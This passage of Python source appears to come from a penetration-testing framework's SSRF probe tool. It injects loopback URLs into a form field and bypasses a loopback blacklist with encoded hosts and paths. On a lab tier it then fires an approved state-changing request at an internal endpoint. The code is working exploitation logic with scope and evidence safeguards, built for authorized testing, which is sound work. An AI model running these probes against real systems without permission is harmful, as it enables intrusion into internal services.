                    ipv4 = await self._request(session, "POST", endpoint_url, ipv4_body)
                    sweep_requests += 1
                    outcome["requestCount"] = 3
                    if not all(
                        self._response_is_bounded(response)
                        for response in (control, localhost, ipv4)
                    ):
                        outcome["reason"] = "control or loopback response was truncated/unbounded"
                        candidate_outcomes.append(outcome)
                        continue

                    control_profile = _structural_profile(control, control_url)
                    localhost_profile = _structural_profile(localhost, localhost_url)
                    ipv4_profile = _structural_profile(ipv4, ipv4_url)
                    derived_path = _derive_common_path(localhost_profile, ipv4_profile)
                    if not derived_path:
                        outcome["reason"] = (
                            "loopback aliases exposed no consistent safe relative path"
                        )
                        candidate_outcomes.append(outcome)
                        continue

                    derived_url = f"http://127.0.0.1{derived_path}"
                    derived_body = build_form_body(
                        injection_field,
                        derived_url,
                        additional_fields,
                    )
                    derived = await self._request(
                        session,
                        "POST",
                        endpoint_url,
                        derived_body,
                    )
                    sweep_requests += 1
                    outcome["requestCount"] = 4
                    if not self._response_is_bounded(derived):
                        outcome["reason"] = "derived-path response was truncated/unbounded"
                        candidate_outcomes.append(outcome)
                        continue
                    derived_profile = _structural_profile(derived, derived_url)

                    alias_similarity = _alias_similarity(
                        localhost_profile,
                        ipv4_profile,
                    )
                    control_differential = _clean_differential(
                        control_profile,
                        localhost_profile,
                    ) and _clean_differential(control_profile, ipv4_profile)
                    derived_corroborated = (
                        _nontrivial_profile(derived_profile)
                        and _clean_differential(control_profile, derived_profile)
                        and max(
                            _alias_similarity(derived_profile, localhost_profile),
                            _alias_similarity(derived_profile, ipv4_profile),
                        )
                        >= 0.35
                    )
                    aliases_matched = (
                        _nontrivial_profile(localhost_profile)
                        and _nontrivial_profile(ipv4_profile)
                        and alias_similarity >= 0.7
                    )
                    if not aliases_matched:
                        outcome["reason"] = (
                            "localhost and 127.0.0.1 lacked matching non-trivial structure"
                        )
                        candidate_outcomes.append(outcome)
                        continue
                    if not control_differential:
                        outcome["reason"] = (
                            "loopback responses did not differ cleanly from the observed control"
                        )
                        candidate_outcomes.append(outcome)
                        continue
                    if not derived_corroborated:
                        outcome["reason"] = (
                            "derived path did not corroborate the loopback-only structure"
                        )
                        candidate_outcomes.append(outcome)
                        continue

                    secrets = (baseline_value, quote_plus(baseline_value))
                    firing_steps = [
                        build_http_evidence_step(
                            AUTO_EXPECTED_STEP_LABELS[0],
                            "POST",
                            endpoint_url,
                            control_body,
                            control,
                            secrets,
                        ),
                        build_http_evidence_step(
                            AUTO_EXPECTED_STEP_LABELS[1],
                            "POST",
                            endpoint_url,
                            localhost_body,
                            localhost,
                            secrets,
                        ),
                        build_http_evidence_step(
                            AUTO_EXPECTED_STEP_LABELS[2],
                            "POST",
                            endpoint_url,
                            ipv4_body,
                            ipv4,
                            secrets,
                        ),
                        build_http_evidence_step(
                            AUTO_EXPECTED_STEP_LABELS[3],
                            "POST",
                            endpoint_url,
                            derived_body,
                            derived,
                            secrets,
                        ),
                    ]
                    if any(step["responseExcerptTruncated"] for step in firing_steps):
                        outcome["reason"] = "sanitized proof transcript was truncated"
                        candidate_outcomes.append(outcome)
                        firing_steps = []
                        continue

                    outcome["confirmed"] = True
                    outcome["derivedPath"] = derived_path
                    candidate_outcomes.append(outcome)
                    firing = {
                        "candidateId": candidate_id,
                        "endpointUrl": endpoint_url,
                        "injectionField": injection_field,
                        "additionalFields": additional_fields,
                        "derivedPath": derived_path,
                        "derivedUrl": derived_url,
                    }
                    firing_profiles = {
                        "controlFingerprint": control_profile["fingerprint"],
                        "localhostFingerprint": localhost_profile["fingerprint"],
                        "ipv4Fingerprint": ipv4_profile["fingerprint"],
                        "derivedFingerprint": derived_profile["fingerprint"],
                        "aliasSimilarity": alias_similarity,
                    }
                    break
                except Exception as exc:
                    outcome["reason"] = sanitize_evidence_text(str(exc), (), 240)
                    candidate_outcomes.append(outcome)

        if firing is None:
            return {
                "success": True,
                "fallback": False,
                "verified": False,
                "reason": "bounded candidate sweep completed without a structural SSRF proof",
                "requestCount": sweep_requests,
                "sweepRequests": sweep_requests,
                "candidatesSwept": len(candidate_outcomes),
                "candidateOutcomes": candidate_outcomes,
                "findings": [],
                "summary": {
                    "verified": False,
                    "mode": AUTO_MODE,
                    "requestCount": sweep_requests,
                    "findingCount": 0,
                },
            }

        verification = {
            "verified": True,
            "fallback": False,
            "mode": AUTO_MODE,
            "proofLevel": AUTO_PROOF_LEVEL,
            "target": target,
            "engagement": "standard",
            "allowUnsafeMethods": True,
            "requestCount": 4,
            "sweepRequests": sweep_requests,
            "candidatesSwept": len(candidate_outcomes),
            "candidateOutcomes": candidate_outcomes,
            "firingCandidate": firing,
            "endpointUrl": firing["endpointUrl"],
            "derivedPath": firing["derivedPath"],
            "literalInternalUrl": "http://localhost/",
            "ipv4InternalUrl": "http://127.0.0.1/",
            "derivedInternalUrl": firing["derivedUrl"],
            "controlDifferential": True,
            "aliasesStructurallyMatched": True,
            "derivedPathCorroborated": True,
            "reflectionOnlyRejected": True,
            "structural": firing_profiles,
            "httpEvidence": {"version": 1, "steps": firing_steps},
        }
        finding = build_nuclei_finding(target, verification)
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": 4,
            "sweepRequests": sweep_requests,
            "verification": verification,
            "findings": [finding],
            "summary": {
                "verified": True,
                "mode": AUTO_MODE,
                "requestCount": 4,
                "sweepRequests": sweep_requests,
                "findingCount": 1,
            },
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_probe_parameters(parameters)
        if not valid:
            return {"success": False, "fallback": False, "error": reason, "findings": []}

        target = _http_target(parameters.get("target") or parameters.get("url"))
        assert target is not None
        if str(parameters["mode"]).lower() == AUTO_MODE:
            return await self._execute_auto(parameters, target)
        proof_level = str(parameters["proofLevel"]).lower()
        is_lab = proof_level == "lab-state-change"
        status_path = str(parameters["statusPath"]) if is_lab else ""
        endpoint_path = str(parameters["endpointPath"])
        internal_path = str(parameters["internalPath"])
        effect_path = str(parameters["effectPath"]) if is_lab else ""
        blocked_token = str(parameters["blockedPathToken"])
        injection_field = str(parameters["injectionField"])
        additional_fields = {
            str(key): str(value)
            for key, value in dict(parameters["additionalFields"]).items()
        }
        markers = {
            "unsolved": str(parameters["unsolvedMarker"]) if is_lab else "",
            "solved": str(parameters["solvedMarker"]) if is_lab else "",
            "denied": str(parameters["deniedMarker"]),
            "filter": str(parameters["filterMarker"]),
            "internal": str(parameters["internalMarker"]),
        }
        expected = {
            "baseline": int(parameters["expectedBaselineStatus"]),
            "denied": int(parameters["expectedDeniedStatus"]),
            "filter": int(parameters["expectedFilterStatus"]),
            "internal": int(parameters["expectedInternalStatus"]),
            "effect": int(parameters["expectedEffectStatus"]),
            "solved": int(parameters["expectedSolvedStatus"]),
        }
        expected_effect_location = str(parameters["expectedEffectLocation"])
        timeout = int(parameters.get("timeoutSeconds") or 15)

        status_url = urljoin(target, status_path)
        endpoint_url = urljoin(target, endpoint_path)
        direct_url = urljoin(target, internal_path)
        literal_url, bypass_url, effect_url = build_internal_urls(
            internal_path,
            effect_path,
            blocked_token,
        )
        literal_body = build_form_body(injection_field, literal_url, additional_fields)
        bypass_body = build_form_body(injection_field, bypass_url, additional_fields)
        effect_body = build_form_body(injection_field, effect_url, additional_fields)

        request_count = 0
        evidence_steps: List[Dict[str, Any]] = []
        timeout_config = aiohttp.ClientTimeout(total=timeout, connect=min(timeout, 8))

        try:
            async with aiohttp.ClientSession(
                timeout=timeout_config,
                cookie_jar=aiohttp.DummyCookieJar(),
            ) as session:
                # #1648 — the unsolved baseline is lab-tier only.
                if is_lab:
                    baseline = await self._request(session, "GET", status_url)
                    request_count += 1
                    if (
                        not self._response_is_bounded(baseline)
                        or baseline["status"] != expected["baseline"]
                        or not response_contains_marker(baseline["body"], markers["unsolved"])
                        or response_contains_marker(baseline["body"], markers["solved"])
                        or response_contains_marker(baseline["body"], markers["internal"])
                    ):
                        raise ValueError("status baseline did not prove a clean unsolved state")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "unsolved-baseline",
                            "GET",
                            status_url,
                            "",
                            baseline,
                        )
                    )

                denied = await self._request(session, "GET", direct_url)
                request_count += 1
                if (
                    not self._response_is_bounded(denied)
                    or denied["status"] != expected["denied"]
                    or not response_contains_marker(denied["body"], markers["denied"])
                    or response_contains_marker(denied["body"], markers["internal"])
                ):
                    raise ValueError("direct resource control did not prove external denial")
                evidence_steps.append(
                    build_http_evidence_step(
                        "direct-resource-denied",
                        "GET",
                        direct_url,
                        "",
                        denied,
                    )
                )

                filtered = await self._request(session, "POST", endpoint_url, literal_body)
                request_count += 1
                if (
                    not self._response_is_bounded(filtered)
                    or filtered["status"] != expected["filter"]
                    or not response_contains_marker(filtered["body"], markers["filter"])
                    or response_contains_marker(filtered["body"], markers["internal"])
                ):
                    raise ValueError("literal loopback control was not rejected by the configured filter")
                evidence_steps.append(
                    build_http_evidence_step(
                        "literal-loopback-filtered",
                        "POST",
                        endpoint_url,
                        literal_body,
                        filtered,
                    )
                )

                bypass = await self._request(session, "POST", endpoint_url, bypass_body)
                request_count += 1
                if (
                    not self._response_is_bounded(bypass)
                    or bypass["status"] != expected["internal"]
                    or not response_contains_marker(bypass["body"], markers["internal"])
                    or response_contains_marker(bypass["body"], markers["denied"])
                    or response_contains_marker(bypass["body"], markers["filter"])
                ):
                    raise ValueError(
                        "encoded loopback probe did not return exclusive internal content"
                    )
                evidence_steps.append(
                    build_http_evidence_step(
                        "encoded-loopback-internal-content",
                        "POST",
                        endpoint_url,
                        bypass_body,
                        bypass,
                    )
                )

                # Every non-effectful control has passed.  Only now perform the
                # explicitly approved state-changing request.
                # #1648 — the operator-approved effect and the solved
                # confirmation are lab-tier only.
                if is_lab:
                    effect = await self._request(session, "POST", endpoint_url, effect_body)
                    request_count += 1
                    if (
                        not self._response_is_bounded(effect)
                        or effect["status"] != expected["effect"]
                        or str(effect["headers"].get("Location") or "")
                        != expected_effect_location
                        or response_contains_marker(effect["body"], markers["internal"])
                    ):
                        raise ValueError("approved effect did not match the configured redirect")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "approved-effect",
                            "POST",
                            endpoint_url,
                            effect_body,
                            effect,
                        )
                    )

                    solved = await self._request(session, "GET", status_url)
                    request_count += 1
                    if (
                        not self._response_is_bounded(solved)
                        or solved["status"] != expected["solved"]
                        or not response_contains_marker(solved["body"], markers["solved"])
                        or response_contains_marker(solved["body"], markers["unsolved"])
                        or response_contains_marker(solved["body"], markers["internal"])
                    ):
                        raise ValueError("post-effect status did not prove the solved transition")
                    evidence_steps.append(
                        build_http_evidence_step(
                            "solved-confirmation",
                            "GET",
                            status_url,
                            "",
                            solved,
                        )
                    )
        except Exception as exc:
            return {
                "success": False,
                "fallback": False,
                "error": sanitize_evidence_text(str(exc), (), 500),
                "requestCount": request_count,
                "findings": [],
            }

        encoded_internal_path = encode_blocked_path(internal_path, blocked_token)
        encoded_effect_path = encode_blocked_path(effect_path, blocked_token)
        verification = {
            "verified": True,
            "fallback": False,
            "mode": "loopback-blacklist-form",
            "target": target,
            "engagement": str(parameters["engagement"]).lower(),
            "allowUnsafeMethods": True,
            "proofLevel": proof_level,
            "endpointPath": endpoint_path,
            "internalPath": internal_path,
            "injectionField": injection_field,
            "additionalFields": additional_fields,
            "blockedPathToken": blocked_token,
            "internalScheme": INTERNAL_SCHEME,
            "literalHost": LITERAL_LOOPBACK_HOST,
            "bypassHost": BYPASS_LOOPBACK_HOST,
            "encodedInternalPath": encoded_internal_path,
            "literalInternalUrl": literal_url,
            "bypassInternalUrl": bypass_url,
            "deniedMarker": markers["denied"],
            "filterMarker": markers["filter"],
            "internalMarker": markers["internal"],
            "expectedDeniedStatus": expected["denied"],
            "expectedFilterStatus": expected["filter"],
            "expectedInternalStatus": expected["internal"],
            "requestCount": request_count,
            "statusChecks": 2 if is_lab else 0,
            "controlRequests": 2,
            "directControlRequests": 1,
            "literalControlRequests": 1,
            "probeRequests": 1,
            "bypassRequests": 1,
            "effectRequests": 1 if is_lab else 0,
            "directDenied": True,
            "literalFiltered": True,
            "internalMarkerAbsentFromControls": True,
            "bypassInternalContent": True,
            "internalContentReached": True,
            "endpointUrl": endpoint_url,
            "httpEvidence": {"version": 1, "steps": evidence_steps},
        }
        # #1648 — lab-only proof material, emitted only on the lab tier.
        if is_lab:
            verification.update(
                {
                    "stateChangeApproved": True,
                    "statusPath": status_path,
                    "effectPath": effect_path,
                    "expectedEffectLocation": expected_effect_location,
                    "encodedEffectPath": encoded_effect_path,
                    "effectInternalUrl": effect_url,
                    "unsolvedMarker": markers["unsolved"],
                    "solvedMarker": markers["solved"],
                    "expectedBaselineStatus": expected["baseline"],
                    "expectedEffectStatus": expected["effect"],
                    "expectedSolvedStatus": expected["solved"],
                    "solvedBefore": False,
                    "effectTriggered": True,
                    "solvedAfter": True,
                }
            )
        return {
            "success": True,
            "fallback": False,
            "target": target,
            "requestCount": request_count,
            "verification": verification,
            "findings": [build_nuclei_finding(target, verification)],
            "summary": {
                "verified": True,
                "mode": "loopback-blacklist-form",
                "requestCount": request_count,
                "findingCount": 1,
            },
        }


def get_tool() -> SsrfProbeTool:
    return SsrfProbeTool()
